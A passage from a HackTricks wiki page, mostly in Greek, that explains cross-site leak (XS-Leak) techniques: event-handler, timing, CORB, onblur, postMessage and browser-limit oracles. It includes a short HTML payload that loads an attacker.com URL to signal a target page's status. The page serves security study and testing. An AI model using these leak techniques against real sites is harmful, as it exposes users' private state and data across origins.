# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Χρησιμοποιήστε [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** με τη βοήθεια των **πιο προηγμένων** εργαλείων της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στο** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) ή στο [**telegram group**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Βασικές Πληροφορίες

Το XS-Search είναι μια μέθοδος που χρησιμοποιείται για **εξαγωγή πληροφοριών από διαφορετικές προελεύσεις** εκμεταλλευόμενη **ευπάθειες πλευρικών καναλιών**.

Τα κύρια στοιχεία που εμπλέκονται σε αυτήν την επίθεση περιλαμβάνουν:

* **Ευάλωτος Ιστός**: Ο στόχος ιστότοπος από τον οποίο προορίζεται να εξαχθούν πληροφορίες.
* **Ιστός Επιτιθέμενου**: Ο κακόβουλος ιστότοπος που δημιουργείται από τον επιτιθέμενο, τον οποίο επισκέπτεται το θύμα, φιλοξενώντας την εκμετάλλευση.
* **Μέθοδος Συμπερίληψης**: Η τεχνική που χρησιμοποιείται για να ενσωματώσει τον Ευάλωτο Ιστό στον Ιστό του Επιτιθέμενου (π.χ., window.open, iframe, fetch, HTML tag με href, κ.λπ.).
* **Τεχνική Διαρροής**: Τεχνικές που χρησιμοποιούνται για να διακρίνουν διαφορές στην κατάσταση του Ευάλωτου Ιστού με βάση τις πληροφορίες που συλλέγονται μέσω της μεθόδου συμπερίληψης.
* **Καταστάσεις**: Οι δύο πιθανές συνθήκες του Ευάλωτου Ιστού, τις οποίες ο επιτιθέμενος στοχεύει να διακρίνει.
* **Ανιχνεύσιμες Διαφορές**: Παρατηρήσιμες παραλλαγές στις οποίες ο επιτιθέμενος βασίζεται για να συμπεράνει την κατάσταση του Ευάλωτου Ιστού.

### Ανιχνεύσιμες Διαφορές

Διάφορες πτυχές μπορούν να αναλυθούν για να διαφοροποιήσουν τις καταστάσεις του Ευάλωτου Ιστού:

* **Κωδικός Κατάστασης**: Διαχωρισμός μεταξύ **διαφορετικών κωδικών κατάστασης HTTP** από διαφορετικές προελεύσεις, όπως σφάλματα διακομιστή, σφάλματα πελάτη ή σφάλματα αυθεντικοποίησης.
* **Χρήση API**: Αναγνώριση της **χρήσης Web APIs** σε σελίδες, αποκαλύπτοντας εάν μια σελίδα από διαφορετική προέλευση χρησιμοποιεί μια συγκεκριμένη JavaScript Web API.
* **Ανακατευθύνσεις**: Ανίχνευση πλοηγήσεων σε διαφορετικές σελίδες, όχι μόνο HTTP ανακατευθύνσεις αλλά και αυτές που ενεργοποιούνται από JavaScript ή HTML.
* **Περιεχόμενο Σελίδας**: Παρατήρηση **παραλλαγών στο σώμα της απόκρισης HTTP** ή σε υπο-πόρους της σελίδας, όπως ο **αριθμός ενσωματωμένων πλαισίων** ή διαφορές μεγέθους σε εικόνες.
* **HTTP Header**: Σημείωση της παρουσίας ή πιθανώς της τιμής ενός **συγκεκριμένου HTTP response header**, συμπεριλαμβανομένων των headers όπως X-Frame-Options, Content-Disposition και Cross-Origin-Resource-Policy.
* **Χρόνος**: Παρατήρηση σταθερών διαφορών χρόνου μεταξύ των δύο καταστάσεων.

### Μέθοδοι Συμπερίληψης

* **HTML Στοιχεία**: Το HTML προσφέρει διάφορα στοιχεία για **συμπερίληψη πόρων από διαφορετικές προελεύσεις**, όπως στυλ, εικόνες ή σενάρια, αναγκάζοντας τον περιηγητή να ζητήσει έναν μη-HTML πόρο. Μια συλλογή πιθανών HTML στοιχείων για αυτόν τον σκοπό μπορεί να βρεθεί στο [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Πλαίσια**: Στοιχεία όπως **iframe**, **object** και **embed** μπορούν να ενσωματώσουν HTML πόρους απευθείας στη σελίδα του επιτιθέμενου. Εάν η σελίδα **λείπει προστασία πλαισίωσης**, η JavaScript μπορεί να έχει πρόσβαση στο αντικείμενο παραθύρου του πλαισιωμένου πόρου μέσω της ιδιότητας contentWindow.
* **Αναδυόμενα Παράθυρα**: Η μέθοδος **`window.open`** ανοίγει έναν πόρο σε μια νέα καρτέλα ή παράθυρο, παρέχοντας μια **χείρα παραθύρου** για την αλληλεπίδραση της JavaScript με μεθόδους και ιδιότητες σύμφωνα με το SOP. Τα αναδυόμενα παράθυρα, που χρησιμοποιούνται συχνά σε διαδικασίες αυτόματης σύνδεσης, παρακάμπτουν τους περιορισμούς πλαισίωσης και cookie ενός πόρου στόχου. Ωστόσο, οι σύγχρονοι περιηγητές περιορίζουν τη δημιουργία αναδυόμενων παραθύρων σε ορισμένες ενέργειες χρηστών.
* **Αιτήματα JavaScript**: Η JavaScript επιτρέπει άμεσες αιτήσεις σε πόρους στόχου χρησιμοποιώντας **XMLHttpRequests** ή το **Fetch API**. Αυτές οι μέθοδοι προσφέρουν ακριβή έλεγχο πάνω στην αίτηση, όπως η επιλογή να ακολουθήσουν HTTP ανακατευθύνσεις.

### Τεχνικές Διαρροής

* **Διαχειριστής Γεγονότων**: Μια κλασική τεχνική διαρροής στα XS-Leaks, όπου οι διαχειριστές γεγονότων όπως **onload** και **onerror** παρέχουν πληροφορίες σχετικά με την επιτυχία ή αποτυχία φόρτωσης πόρων.
* **Μηνύματα Σφάλματος**: Εξαιρέσεις JavaScript ή ειδικές σελίδες σφαλμάτων μπορούν να παρέχουν πληροφορίες διαρροής είτε άμεσα από το μήνυμα σφάλματος είτε διαχωρίζοντας την παρουσία και την απουσία του.
* **Παγκόσμια Όρια**: Φυσικοί περιορισμοί ενός περιηγητή, όπως η χωρητικότητα μνήμης ή άλλοι επιβεβλημένοι περιορισμοί του περιηγητή, μπορούν να σήμαναν πότε έχει φτάσει ένα όριο, λειτουργώντας ως τεχνική διαρροής.
* **Παγκόσμια Κατάσταση**: Ανιχνεύσιμες αλληλεπιδράσεις με τις **παγκόσμιες καταστάσεις** των περιηγητών (π.χ., η διεπαφή Ιστορίας) μπορούν να εκμεταλλευτούν. Για παράδειγμα, ο **αριθμός των καταχωρήσεων** στην ιστορία ενός περιηγητή μπορεί να προσφέρει ενδείξεις σχετικά με σελίδες από διαφορετικές προελεύσεις.
* **Performance API**: Αυτό το API παρέχει **λεπτομέρειες απόδοσης της τρέχουσας σελίδας**, συμπεριλαμβανομένου του χρόνου δικτύου για το έγγραφο και τους φορτωμένους πόρους, επιτρέποντας συμπεράσματα σχετικά με τους ζητούμενους πόρους.
* **Αναγνώσιμες Ιδιότητες**: Ορισμένες HTML ιδιότητες είναι **αναγνώσιμες από διαφορετικές προελεύσεις** και μπορούν να χρησιμοποιηθούν ως τεχνική διαρροής. Για παράδειγμα, η ιδιότητα `window.frame.length` επιτρέπει στη JavaScript να μετρά τα πλαίσια που περιλαμβάνονται σε μια ιστοσελίδα από διαφορετική προέλευση.

## Εργαλείο & Έγγραφο XSinator

Το XSinator είναι ένα αυτόματο εργαλείο για **έλεγχο περιηγητών έναντι αρκετών γνωστών XS-Leaks** που εξηγούνται στο έγγραφό του: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Μπορείτε να **έχετε πρόσβαση στο εργαλείο στο** [**https://xsinator.com/**](https://xsinator.com/)

{% hint style="warning" %}
**Εξαιρούμενες XS-Leaks**: Αναγκαστήκαμε να εξαιρέσουμε XS-Leaks που βασίζονται σε **εργαζόμενους υπηρεσιών** καθώς θα παρεμβαίνουν σε άλλες διαρροές στο XSinator. Επιπλέον, επιλέξαμε να **εξαιρέσουμε XS-Leaks που βασίζονται σε κακή διαμόρφωση και σφάλματα σε μια συγκεκριμένη εφαρμογή ιστού**. Για παράδειγμα, κακές διαμορφώσεις CrossOrigin Resource Sharing (CORS), διαρροές postMessage ή Cross-Site Scripting. Επιπλέον, εξαιρέσαμε τις χρονικά βασισμένες XS-Leaks καθώς συχνά υποφέρουν από αργές, θορυβώδεις και ανακριβείς διαδικασίες.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** με τη βοήθεια των **πιο προηγμένων** εργαλείων της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## **Τεχνικές Βασισμένες στο Χρόνο**

Ορισμένες από τις παρακάτω τεχνικές θα χρησιμοποιήσουν το χρόνο ως μέρος της διαδικασίας για να ανιχνεύσουν διαφορές στις πιθανές καταστάσεις των ιστοσελίδων. Υπάρχουν διάφοροι τρόποι μέτρησης του χρόνου σε έναν περιηγητή ιστού.

**Ρολόγια**: Το [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API επιτρέπει στους προγραμματιστές να αποκτούν μετρήσεις χρόνου υψηλής ανάλυσης.\
Υπάρχει ένας σημαντικός αριθμός APIs που μπορούν να καταχραστούν οι επιτιθέμενοι για να δημιουργήσουν έμμεσες ρολόγια: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animations, και άλλα.\
Για περισσότερες πληροφορίες: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Τεχνικές Διαχειριστή Γεγονότων

### Onload/Onerror

* **Μέθοδοι Συμπερίληψης**: Πλαίσια, HTML Στοιχεία
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης
* **Περισσότερες πληροφορίες**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Περίληψη**: αν προσπαθείτε να φορτώσετε έναν πόρο, τα γεγονότα onerror/onload ενεργοποιούνται με την επιτυχία/αποτυχία φόρτωσης του πόρου, είναι δυνατόν να καταλάβετε τον κωδικό κατάστασης.
* **Παράδειγμα κώδικα**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Το παράδειγμα κώδικα προσπαθεί να **φορτώσει αντικείμενα σενάριο από JS**, αλλά **άλλα tags** όπως αντικείμενα, στυλ, εικόνες, ήχοι θα μπορούσαν επίσης να χρησιμοποιηθούν. Επιπλέον, είναι επίσης δυνατό να εισαχθεί το **tag απευθείας** και να δηλωθούν τα γεγονότα `onload` και `onerror` μέσα στο tag (αντί να τα εισάγουμε από JS).

Υπάρχει επίσης μια έκδοση χωρίς σενάριο αυτής της επίθεσης:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
In this case if `example.com/404` is not found `attacker.com/?error` will be loaded.

### Onload Timing

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Summary:** The [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** can be used to measure how much time it takes to perform a request. However, other clocks could be used, such as [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) which can identify tasks running for more than 50ms.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) another example in:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Forced Heavy Task

Αυτή η τεχνική είναι ακριβώς όπως η προηγούμενη, αλλά ο **attacker** θα **αναγκάσει** κάποια ενέργεια να διαρκέσει μια **σχετική ποσότητα χρόνου** όταν η **απάντηση είναι θετική ή αρνητική** και θα μετρήσει αυτόν τον χρόνο.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **Inclusion Methods**: Frames
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Summary:** The [SharedArrayBuffer clock](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) can be used to measure how much time it takes to perform a request. Other clocks could be used.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Ο χρόνος που απαιτείται για να ανακτηθεί μια πηγή μπορεί να μετρηθεί χρησιμοποιώντας τα [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) και [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event) γεγονότα. Το **`beforeunload`** γεγονός ενεργοποιείται όταν ο περιηγητής πρόκειται να πλοηγηθεί σε μια νέα σελίδα, ενώ το **`unload`** γεγονός συμβαίνει όταν η πλοήγηση πραγματοποιείται πραγματικά. Η διαφορά χρόνου μεταξύ αυτών των δύο γεγονότων μπορεί να υπολογιστεί για να προσδιοριστεί η **διάρκεια που δαπάνησε ο περιηγητής για να ανακτήσει την πηγή**.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Inclusion Methods**: Frames
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Summary:** The [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API can be used to measure how much time it takes to perform a request. Other clocks could be used.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Έχει παρατηρηθεί ότι στην απουσία των [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/), ο χρόνος που απαιτείται για να φορτώσει μια σελίδα και οι υποπηγές της μέσω του δικτύου μπορεί να μετρηθεί από έναν επιτιθέμενο. Αυτή η μέτρηση είναι συνήθως δυνατή επειδή ο χειριστής `onload` ενός iframe ενεργοποιείται μόνο μετά την ολοκλήρωση της φόρτωσης των πόρων και της εκτέλεσης JavaScript. Για να παρακαμφθεί η μεταβλητότητα που εισάγεται από την εκτέλεση σεναρίων, ένας επιτιθέμενος μπορεί να χρησιμοποιήσει το [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) χαρακτηριστικό μέσα στο `<iframe>`. Η συμπερίληψη αυτού του χαρακτηριστικού περιορίζει πολλές λειτουργίες, ιδίως την εκτέλεση JavaScript, διευκολύνοντας έτσι μια μέτρηση που επηρεάζεται κυρίως από την απόδοση του δικτύου.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

* **Inclusion Methods**: Frames
* **Detectable Difference**: Περιεχόμενο Σελίδας
* **More info**:
* **Summary**: Αν μπορείτε να κάνετε τη σελίδα να εμφανίζει σφάλμα όταν προσπελάσετε το σωστό περιεχόμενο και να φορτώνει σωστά όταν προσπελάσετε οποιοδήποτε περιεχόμενο, τότε μπορείτε να δημιουργήσετε έναν βρόχο για να εξάγετε όλες τις πληροφορίες χωρίς να μετράτε τον χρόνο.
* **Code Example**:

Υποθέστε ότι μπορείτε να **εισάγετε** τη **σελίδα** που έχει το **μυστικό** περιεχόμενο **μέσα σε ένα Iframe**.

Μπορείτε να **κάνετε το θύμα να αναζητήσει** το αρχείο που περιέχει "_**flag**_" χρησιμοποιώντας ένα **Iframe** (εκμεταλλευόμενοι ένα CSRF για παράδειγμα). Μέσα στο Iframe γνωρίζετε ότι το _**onload event**_ θα εκτελείται **πάντα τουλάχιστον μία φορά**. Στη συνέχεια, μπορείτε να **αλλάξετε** τη **διεύθυνση URL** του **iframe** αλλάζοντας μόνο το **περιεχόμενο** του **hash** μέσα στη διεύθυνση URL.

Για παράδειγμα:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Αν η πρώτη διεύθυνση URL **φορτώθηκε επιτυχώς**, τότε, όταν **αλλάξετε** το **hash** μέρος της διεύθυνσης URL, το **onload** event **δεν θα ενεργοποιηθεί** ξανά. Αλλά **αν** η σελίδα είχε κάποιο είδος **σφάλματος** κατά τη **φόρτωση**, τότε, το **onload** event θα **ενεργοποιηθεί ξανά**.

Στη συνέχεια, μπορείτε να **διακρίνετε μεταξύ** μιας **σωστά** φορτωμένης σελίδας ή μιας σελίδας που έχει ένα **σφάλμα** όταν προσπελάζεται.

### Javascript Execution

* **Inclusion Methods**: Frames
* **Detectable Difference**: Περιεχόμενο Σελίδας
* **More info**:
* **Summary:** Αν η **σελίδα** **επιστρέφει** το **ευαίσθητο** περιεχόμενο, **ή** ένα **περιεχόμενο** που μπορεί να ελεγχθεί από τον χρήστη. Ο χρήστης θα μπορούσε να ορίσει **έγκυρο JS κώδικα στην αρνητική περίπτωση**, να **φορτώνει** κάθε προσπάθεια μέσα σε **`<script>`** ετικέτες, έτσι σε **αρνητικές** περιπτώσεις ο **κώδικας** των επιτιθεμένων **εκτελείται,** και σε **θετικές** περιπτώσεις **τίποτα** δεν θα εκτελείται.
* **Code Example:**

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Κωδικός Κατάστασης & Επικεφαλίδες
* **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Summary**: **Cross-Origin Read Blocking (CORB)** είναι ένα μέτρο ασφαλείας που αποτρέπει τις ιστοσελίδες από το να φορτώνουν ορισμένους ευαίσθητους πόρους από άλλες προελεύσεις για να προστατεύσουν από επιθέσεις όπως το **Spectre**. Ωστόσο, οι επιτιθέμενοι μπορούν να εκμεταλλευτούν τη συμπεριφορά προστασίας του. Όταν μια απάντηση που υπόκειται σε **CORB** επιστρέφει έναν _**CORB protected**_ `Content-Type` με `nosniff` και έναν κωδικό κατάστασης `2xx`, το **CORB** αφαιρεί το σώμα και τις επικεφαλίδες της απάντησης. Οι επιτιθέμενοι που παρατηρούν αυτό μπορούν να συμπεράνουν τη συνδυασμένη **κατάσταση κωδικού** (που υποδηλώνει επιτυχία ή σφάλμα) και το `Content-Type` (που δηλώνει αν είναι προστατευμένο από **CORB**), οδηγώντας σε πιθανή διαρροή πληροφοριών.
* **Code Example**:

Ελέγξτε τον σύνδεσμο περισσότερων πληροφοριών για περισσότερες πληροφορίες σχετικά με την επίθεση.

### onblur

* **Inclusion Methods**: Frames
* **Detectable Difference**: Περιεχόμενο Σελίδας
* **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Summary**: Διαρροή ευαίσθητων δεδομένων από το id ή το όνομα χαρακτηριστικό.
* **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Είναι δυνατόν να **φορτώσετε μια σελίδα** μέσα σε ένα **iframe** και να χρησιμοποιήσετε το **`#id_value`** για να κάνετε τη σελίδα να **εστιάζει στο στοιχείο** του iframe με το υποδεικνυόμενο id, στη συνέχεια αν ενεργοποιηθεί ένα σήμα **`onblur`**, το στοιχείο ID υπάρχει.\
Μπορείτε να εκτελέσετε την ίδια επίθεση με **`portal`** ετικέτες.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Χρήση API
* **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Summary**: Συγκέντρωση ευαίσθητων πληροφοριών από ένα postMessage ή χρήση της παρουσίας των postMessages ως οράκλας για να γνωρίζετε την κατάσταση του χρήστη στη σελίδα
* **Code Example**: `Οποιοσδήποτε κώδικας ακούει για όλα τα postMessages.`

Οι εφαρμογές χρησιμοποιούν συχνά [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) για να επικοινωνούν μεταξύ διαφορετικών προελεύσεων. Ωστόσο, αυτή η μέθοδος μπορεί ακούσια να εκθέσει **ευαίσθητες πληροφορίες** αν η παράμετρος `targetOrigin` δεν καθοριστεί σωστά, επιτρέποντας σε οποιοδήποτε παράθυρο να λάβει τα μηνύματα. Επιπλέον, η απλή πράξη λήψης ενός μηνύματος μπορεί να λειτουργήσει ως **οράκλας**; για παράδειγμα, ορισμένα μηνύματα μπορεί να αποστέλλονται μόνο σε χρήστες που είναι συνδεδεμένοι. Επομένως, η παρουσία ή η απουσία αυτών των μηνυμάτων μπορεί να αποκαλύψει πληροφορίες σχετικά με την κατάσταση ή την ταυτότητα του χρήστη, όπως αν είναι αυθεντικοποιημένος ή όχι.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Χρησιμοποιήστε [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** που υποστηρίζονται από τα **πιο προηγμένα** εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Global Limits Techniques

### WebSocket API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Χρήση API
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: Η εξάντληση του ορίου σύνδεσης WebSocket διαρρέει τον αριθμό των συνδέσεων WebSocket μιας σελίδας από άλλη προέλευση.
* **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Είναι δυνατόν να προσδιορίσετε αν, και πόσες, **συνδέσεις WebSocket χρησιμοποιεί μια στοχευμένη σελίδα**. Αυτό επιτρέπει σε έναν επιτιθέμενο να ανιχνεύσει τις καταστάσεις της εφαρμογής και να διαρρεύσει πληροφορίες που σχετίζονται με τον αριθμό των συνδέσεων WebSocket.

Αν μια **προέλευση** χρησιμοποιεί το **μέγιστο ποσό αντικειμένων σύνδεσης WebSocket**, ανεξάρτητα από την κατάσταση των συνδέσεών τους, η δημιουργία **νέων αντικειμένων θα έχει ως αποτέλεσμα εξαιρέσεις JavaScript**. Για να εκτελέσετε αυτήν την επίθεση, η ιστοσελίδα του επιτιθέμενου ανοίγει την στοχευμένη ιστοσελίδα σε ένα αναδυόμενο παράθυρο ή iframe και στη συνέχεια, αφού έχει φορτωθεί η στοχευμένη ιστοσελίδα, προσπαθεί να δημιουργήσει τον μέγιστο αριθμό δυνατών συνδέσεων WebSocket. Ο **αριθμός των εκτιναγμένων εξαιρέσεων** είναι ο **αριθμός των συνδέσεων WebSocket που χρησιμοποιούνται από την στοχευμένη ιστοσελίδα**.

### Payment API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Χρήση API
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: Ανίχνευση Αιτήματος Πληρωμής επειδή μόνο ένα μπορεί να είναι ενεργό τη φορά.
* **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Αυτή η XS-Leak επιτρέπει σε έναν επιτιθέμενο να **ανιχνεύσει πότε μια σελίδα από άλλη προέλευση ξεκινά ένα αίτημα πληρωμής**.

Επειδή **μόνο ένα αίτημα πληρωμής μπορεί να είναι ενεργό** τη φορά, αν η στοχευμένη ιστοσελίδα χρησιμοποιεί το Payment Request API, οποιαδήποτε περαιτέρω προσπάθεια να χρησιμοποιήσει αυτό το API θα αποτύχει**, και θα προκαλέσει μια **εξαίρεση JavaScript**. Ο επιτιθέμενος μπορεί να εκμεταλλευτεί αυτό προσπαθώντας **περιοδικά να εμφανίσει το UI του Payment API**. Αν μια προσπάθεια προκαλέσει εξαίρεση, η στοχευμένη ιστοσελίδα το χρησιμοποιεί αυτή τη στιγμή. Ο επιτιθέμενος μπορεί να κρύψει αυτές τις περιοδικές προσπάθειες κλείνοντας αμέσως το UI μετά τη δημιουργία του.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Χρονισμός (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Summary:** Μετρήστε τον χρόνο εκτέλεσης ενός ιστού εκμεταλλευόμενοι τον μονόνημα JS event loop.
* **Code Example**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

Η JavaScript λειτουργεί σε ένα [μονόνημα event loop](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) μοντέλο ταυτόχρονης εκτέλεσης, υποδηλώνοντας ότι **μπορεί να εκτελεί μόνο μία εργασία τη φορά**. Αυτή η χαρακτηριστική μπορεί να εκμεταλλευτεί για να μετρήσει **πόσο χρόνο χρειάζεται ο κώδικας από μια διαφορετική προέλευση για να εκτελεστεί**. Ένας επιτιθέμενος μπορεί να μετρήσει τον χρόνο εκτέλεσης του δικού του κώδικα στο event loop αποστέλλοντας συνεχώς γεγονότα με σταθερές ιδιότητες. Αυτά τα γεγονότα θα επεξεργαστούν όταν η δεξαμενή γεγονότων είναι άδεια. Αν και άλλες προελεύσεις αποστέλλουν επίσης γεγονότα στην ίδια δεξαμενή, ένας **επιτιθέμενος μπορεί να συμπεράνει τον χρόνο που χρειάζεται για να εκτελούνται αυτά τα εξωτερικά γεγονότα παρατηρώντας καθυστερήσεις στην εκτέλεση των δικών του εργασιών**. Αυτή η μέθοδος παρακολούθησης του event loop για καθυστερήσεις μπορεί να αποκαλύψει τον χρόνο εκτέλεσης του κώδικα από διαφορετικές προελεύσεις, ενδεχομένως εκθέτοντας ευαίσθητες πληροφορίες.

{% hint style="warning" %}
Σε έναν χρονισμό εκτέλεσης είναι δυνατόν να **εξαλείψετε** **παράγοντες δικτύου** για να αποκτήσετε **πιο ακριβείς μετρήσεις**. Για παράδειγμα, φορτώνοντας τους πόρους που χρησιμοποιούνται από τη σελίδα πριν τη φορτώσετε.
{% endhint %}

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Χρονισμός (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
